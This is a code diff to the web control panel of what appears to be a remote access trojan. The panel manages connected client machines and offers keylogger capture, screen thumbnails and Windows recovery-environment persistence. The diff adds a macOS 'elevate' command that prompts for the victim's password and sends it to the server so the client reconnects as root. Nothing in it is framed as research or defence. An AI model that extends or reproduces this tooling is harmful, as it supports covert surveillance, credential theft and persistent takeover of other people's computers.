@@ -9,6 +9,7 @@ import {
   sendCommand,
   requestPreview,
   requestThumbnail,
+  markManualDisconnect,
 } from "./data.js";
 import { initCountryPicker } from "./country-picker.js";
 
@@ -195,6 +196,18 @@ function applyMenuSupportRules(clientId) {
     isWindows,
     "Keylogger capture is only fully supported on Windows clients.",
   );
+
+  const winreBtn = menu.querySelector('[data-open="winre"]');
+  if (winreBtn) {
+    setAvailability(winreBtn, isWindows, "WinRE Persistence is only supported on Windows clients.");
+    const label = winreBtn.querySelector("span");
+    if (label) label.style.textDecoration = isWindows ? "" : "line-through";
+  }
+
+  const elevateBtn = menu.querySelector('[data-action="elevate"]');
+  if (elevateBtn) {
+    elevateBtn.style.display = platform === "mac" ? "" : "none";
+  }
 }
 
 async function loadCurrentUser() {
@@ -289,7 +302,7 @@ async function loadCurrentUser() {
 
       initializeRenderer();
     } else {
-      window.location.href = "/login.html";
+      window.location.href = "/";
     }
   } catch (err) {
     console.error("Failed to load user:", err);
@@ -608,6 +621,7 @@ bulkDisconnectBtn?.addEventListener("click", async () => {
 
   let success = 0;
   for (const clientId of selectedClients) {
+    markManualDisconnect(clientId);
     const ok = await sendCommand(clientId, "disconnect");
     if (ok) success++;
   }
@@ -932,6 +946,40 @@ menu.addEventListener("click", async (e) => {
     alert("Client is offline. This command can only be used while the client is online.");
     closeMenu(clearContext);
     return;
+  }
+
+  if (action === "elevate") {
+    const password = prompt("Enter the user's macOS password for sudo elevation:");
+    if (!password) {
+      closeMenu(clearContext);
+      return;
+    }
+    try {
+      const res = await fetch(`/api/clients/${contextCard}/command`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "elevate", password }),
+      });
+      const data = await res.json().catch(() => ({}));
+      if (data.ok) {
+        alert(data.message || "Elevation successful — client will reconnect as root.");
+        // Stagger thumbnail requests to catch the client after it reconnects
+        setTimeout(() => requestThumbnail(contextCard), 5000);
+        setTimeout(() => requestThumbnail(contextCard), 10000);
+        setTimeout(() => requestThumbnail(contextCard), 18000);
+      } else {
+        alert(data.error || data.message || "Elevation failed.");
+      }
+    } catch (err) {
+      alert("Elevation request failed: " + err.message);
+    }
+    closeMenu(clearContext);
+    setTimeout(() => loadWithOptions({ force: true }), 5000);
+    return;
+  }
+
+  if (action === "disconnect") {
+    markManualDisconnect(contextCard);
   }
 
   const ok = await sendCommand(contextCard, action);
